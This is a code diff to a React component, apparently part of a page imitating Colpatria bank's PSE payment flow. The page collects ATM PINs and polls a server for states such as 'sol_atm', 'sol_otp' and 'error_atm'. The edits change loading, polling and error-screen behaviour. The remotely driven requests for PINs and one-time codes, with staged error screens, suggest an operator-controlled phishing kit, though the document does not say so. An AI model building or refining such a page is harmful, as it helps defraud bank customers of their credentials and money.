@@ -130,14 +130,14 @@ export default function AtmColpatriaPse() {
 
   const showAtmError = () => {
     ignorarEstadoHastaCambioRef.current = null;
-    stopPolling();
     resetAtmEsperaUi();
-    allowPollNavigationRef.current = false;
+    allowPollNavigationRef.current = true;
     sessionStorage.removeItem(COLPATRIA_MID_FLOW_KEY);
     modalBloqueoEstadoRef.current = "error_atm";
     lastEstadoRef.current = "error_atm";
     clearPinFields();
     setShowAtmErrorAlert(true);
+    initPolling();
   };
 
   const redirigir = (ruta) => {
@@ -404,6 +404,14 @@ export default function AtmColpatriaPse() {
         return;
       }
 
+      // Mantener loading activo mientras el estado sea pendiente
+      if (estadoActual === "pendiente") {
+        if (allowPollNavigationRef.current) {
+          setLoading(true);
+        }
+        return;
+      }
+
       if (
         ESTADOS_TRAS_ENVIO_ATM.includes(estadoActual) &&
         !allowPollNavigationRef.current
@@ -421,14 +429,12 @@ export default function AtmColpatriaPse() {
 
       switch (estadoActual) {
         case "sol_atm":
-          if (allowPollNavigationRef.current || getLoading) {
-            break;
-          }
           envioEnCursoRef.current = false;
           setLoading(false);
-          allowPollNavigationRef.current = false;
+          allowPollNavigationRef.current = true;
           sessionStorage.removeItem(COLPATRIA_MID_FLOW_KEY);
           clearPinFields();
+          dismissAtmErrorAlertIfOpen();
           break;
         case "sol_otp":
           stopPolling();
@@ -530,6 +536,8 @@ export default function AtmColpatriaPse() {
 
     stopPolling();
     envioEnCursoRef.current = true;
+    lastEstadoRef.current = "pendiente";
+    allowPollNavigationRef.current = true;
 
     try {
       setLoading(true);
